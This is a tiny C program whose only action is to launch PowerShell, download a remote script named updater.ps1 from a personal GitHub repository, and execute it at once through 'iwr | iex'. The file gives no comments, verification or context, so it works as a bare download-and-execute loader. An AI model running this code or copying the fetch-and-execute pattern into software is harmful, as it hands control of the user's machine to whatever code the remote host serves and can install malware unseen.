#include <stdlib.h>

int main() {
    int result = system("powershell -c \"iwr -useb https://raw.githubusercontent.com/syltr1x/ICS/main/updater.ps1 | iex\"");
    return 0;
}
